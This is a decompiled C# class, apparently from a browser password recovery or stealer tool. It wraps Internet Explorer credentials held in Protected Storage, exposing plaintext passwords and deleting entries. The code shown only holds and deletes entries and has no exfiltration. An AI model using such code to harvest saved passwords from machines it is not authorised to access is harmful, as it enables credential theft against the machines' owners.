using System;

namespace BrowserPasswords
{
	// Token: 0x0200001C RID: 28
	internal class CIEPassword
	{
		// Token: 0x06000113 RID: 275 RVA: 0x000036C8 File Offset: 0x000018C8
		internal CIEPassword(CProtectStore PStore, string szResourceName, string szUserName, string szPasswd, DateTime dtAddDate, int dwType)
		{
			this.guidIE = new Guid("{E161255A-37C3-11D2-BCAA-00C04FD929DB}");
			if (this.m_IPStore == null)
			{
				this.m_IPStore = PStore;
			}
			this.m_dtAddDate = dtAddDate;
			this.m_dwType = dwType;
			this.m_szPassword = szPasswd;
			this.m_szResourceName = szResourceName;
			this.m_szUserName = szUserName;
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00003720 File Offset: 0x00001920
		public void DeletePassword()
		{
			this.m_IPStore.DeleteItem(this.guidIE, this.guidIE, this.m_szResourceName + ":StringData");
			this.m_IPStore.DeleteItem(this.guidIE, this.guidIE, this.m_szResourceName + ":StringIndex");
		}

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x06000115 RID: 277 RVA: 0x0000377C File Offset: 0x0000197C
		public string ResourceName
		{
			get
			{
				return this.m_szResourceName;
			}
		}

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x06000116 RID: 278 RVA: 0x00003794 File Offset: 0x00001994
		public string UserName
		{
			get
			{
				return this.m_szUserName;
			}
		}

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x06000117 RID: 279 RVA: 0x000037AC File Offset: 0x000019AC
		public string Password
		{
			get
			{
				return this.m_szPassword;
			}
		}

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000118 RID: 280 RVA: 0x000037C4 File Offset: 0x000019C4
		public DateTime AddDate
		{
			get
			{
				return this.m_dtAddDate;
			}
		}

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x06000119 RID: 281 RVA: 0x000037DC File Offset: 0x000019DC
		public int PasswdType
		{
			get
			{
				return this.m_dwType;
			}
		}

		// Token: 0x040000DF RID: 223
		private readonly Guid guidIE;

		// Token: 0x040000E0 RID: 224
		private CProtectStore m_IPStore;

		// Token: 0x040000E1 RID: 225
		private string m_szResourceName;

		// Token: 0x040000E2 RID: 226
		private string m_szUserName;

		// Token: 0x040000E3 RID: 227
		private string m_szPassword;

		// Token: 0x040000E4 RID: 228
		private DateTime m_dtAddDate;

		// Token: 0x040000E5 RID: 229
		private int m_dwType;
	}
}
